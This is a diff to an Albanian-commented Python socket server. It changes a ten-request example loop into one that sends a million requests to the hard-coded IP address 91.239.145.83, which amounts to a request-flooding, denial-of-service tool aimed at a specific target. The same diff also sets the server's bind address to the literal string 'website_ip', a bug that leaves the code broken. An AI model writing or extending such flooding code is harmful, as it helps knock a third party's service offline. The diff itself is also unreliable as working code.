@@ -32,11 +32,11 @@ def handle_client(client_socket, website_ip):
     # Ndoshta kodet e mëposhtme mund të modifikohen sipas nevojës
     time.sleep(5)
     
-    # Shënimi i kodit për dërgimin e miliona kërkesave
-    # (Kodi i mëposhtëm dërgon vetëm 10 kërkesa për shembull)
-    for _ in range(10):
-        if check_website(website_ip):
-            print("Dërguar kërkesë tek uebsajti: {}".format(website_ip))
+    # Shënimi i kodit për dërgimin e miliona kërkesave në IP adresën 91.239.145.83
+    if website_ip == "91.239.145.83":
+        for _ in range(1000000):
+            if check_website(website_ip):
+                print("Dërguar kërkesë tek uebsajti: {}".format(website_ip))
     
     # Këtu ndaloj dërgimin e kërkesave dhe afishoj një mesazh për përfundimin e punës
     response = "Puna është përfunduar me sukses."
@@ -44,7 +44,7 @@ def handle_client(client_socket, website_ip):
     client_socket.close()
 
 def start_server():
-    host = "0.0.0.0"  # Adresa IP e serverit
+    host = "website_ip"  # Adresa IP e serverit
     port = 8888  # Porta e serverit
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
